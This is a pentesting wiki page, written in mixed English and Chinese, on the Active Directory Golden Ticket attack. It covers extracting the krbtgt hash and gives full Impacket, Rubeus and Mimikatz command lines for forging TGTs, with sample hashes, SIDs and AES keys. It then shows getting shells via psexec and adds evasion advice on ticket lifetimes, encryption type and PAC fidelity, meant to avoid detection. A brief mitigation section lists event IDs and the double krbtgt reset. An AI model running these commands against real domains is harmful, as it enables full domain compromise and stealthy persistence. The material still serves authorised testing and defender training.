# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** attack consists of using the **NTLM hash of the Active Directory (AD) krbtgt account** to **create a legitimate Ticket Granting Ticket (TGT) that impersonates any user**. This technique is particularly advantageous because it **enables access to any service or machine** within the domain as the impersonated user. 需要特别注意，**krbtgt account 的凭据不会自动更新**。<sup>[[1]](#references)</sup>

要**获取 krbtgt account 的 NTLM hash**，可以采用多种方法。可以从域内任意 Domain Controller (DC) 上的 **Local Security Authority Subsystem Service (LSASS) process** 或 **NT Directory Services (NTDS.dit) file** 中提取。此外，执行 **DCsync attack** 也是获取该 NTLM hash 的另一种方式，可以使用 Mimikatz 中的 **lsadump::dcsync module** 或 Impacket 提供的 **secretsdump.py script**。需要强调的是，要执行这些操作，通常需要 **domain admin privileges 或类似级别的访问权限**。<sup>[[2]](#references)</sup>

虽然 NTLM hash 是实现此目的的一种可行方法，但出于 operational security 的考虑，**强烈建议**使用 **Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** 来 **forge tickets**。在现代 domains 中，这一点更加重要，因为 **RC4 的使用正在逐步淘汰**，并且在 Kerberos telemetry 中会更加明显。<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### 现代 ticket crafting 注意事项

如果可行，先**查询 LDAP 和 SYSVOL**，然后使用真实的域策略和用户 PAC 值来伪造 ticket，而不是手动编造这些值：<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` 向 DC 请求用于构建更真实 PAC 的用户、组、NetBIOS 和策略数据。
- `/printcmd` 输出一条包含所获取 PAC 字段的离线命令行；如果之后希望在不再次接触 LDAP 的情况下伪造相同 ticket，这会很有用。
- `/extendedupndns` 添加包含 `samAccountName` 和账户 SID 的较新 `UpnDns` PAC 元素。
- `/oldpac` 移除较新的 `Requestor` 和 `Attributes` PAC 缓冲区；这主要用于针对旧环境进行兼容性测试，而不是默认的 tradecraft。

在 Linux 中，较新的 Impacket 版本也支持添加较新的 PAC 结构，并设置更真实的有效期：
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` 的单位是**小时**。默认值为 **10 年**，这会产生较明显的噪声。
- `-extra-pac` 会添加较新的 `UPN_DNS` PAC 信息。
- `-old-pac` 会强制使用旧版 PAC 布局。
- 当 PAC 需要额外的 SID 时，`-extra-sid` 很有用（例如，在子域到父域的提权场景中，[SID-History Injection](sid-history-injection.md) 中对此有介绍）。

**一旦**注入了 **golden Ticket**，你就可以访问共享文件 **(C$)**，并执行服务和 WMI，因此可以使用 **psexec** 或 **wmiexec** 获取 shell（看起来无法通过 winrm 获取 shell）。

### 绕过常见检测

检测 golden ticket 最常见的方法是**检查网络传输中的 Kerberos 流量**。默认情况下，Mimikatz **会将 TGT 的有效期签署为 10 年**，这会在后续使用该 TGT 发出的 TGS 请求中显得异常。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

使用 `/startoffset`、`/endin` 和 `/renewmax` 参数来控制开始偏移量、持续时间和最大续订次数（单位均为分钟）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
遗憾的是，TGT 的生命周期不会记录在 4769 事件中，因此你无法在 Windows 事件日志中找到此信息。不过，你可以关联分析的是：**在没有先出现 4768 的情况下看到 4769**。**没有 TGT 就不可能请求 TGS**；如果没有 TGT 被签发的记录，我们就可以推断该 TGT 是在离线状态下伪造的。

在**较新的 Windows 版本**中，事件 ID **4768** 和 **4769** 还提供了更完善的**加密类型遥测信息**。如果域中的 `krbtgt`、客户端和服务都已经拥有 AES 密钥，那么使用 **RC4 (`0x17`)** 的伪造 TGT/TGS 会比几年前更容易被发现。这也是应优先使用 **AES-backed Golden Tickets**，并尽可能匹配域正常 Kerberos 策略的另一个原因。

另一个 OPSEC 问题是 **PAC fidelity**。如果票据包含不可能存在的组成员关系、缺少较新的 PAC 缓冲区，或账户元数据与 LDAP 不匹配，那么当防御者将 PAC 内容与 AD 数据进行验证时，就更容易被检测到。如果你需要一个看起来确实由 DC 签发的 TGT，请参考：

{{#ref}}
diamond-ticket.md
{{#endref}}

持久化还存在一些**环境限制**。`krbtgt` 账户会保留**长度为 2 的密码历史记录**，因此，如果伪造的 TGT 使用旧密钥签名，那么在**第一次**重置 `krbtgt` 后仍可能保持有效。这就是防御者通过**重置 `krbtgt` 两次**，并在两次重置之间至少等待域的最大票据生命周期，来使 Golden Tickets 失效的原因。<sup>[[3]](#references)</sup>

要**绕过此检测**，请查看 diamond tickets。

### 缓解措施

- 4624：账户登录
- 4672：管理员登录
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者还可以采用一些其他小技巧，例如针对**敏感用户**的 4769 事件发出警报，例如默认域管理员账户；对于通常签发 AES 票据的域，还可以针对 `krbtgt` 的 **RC4 使用情况**发出警报。<sup>[[5]](#references)</sup>

## 参考资料

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
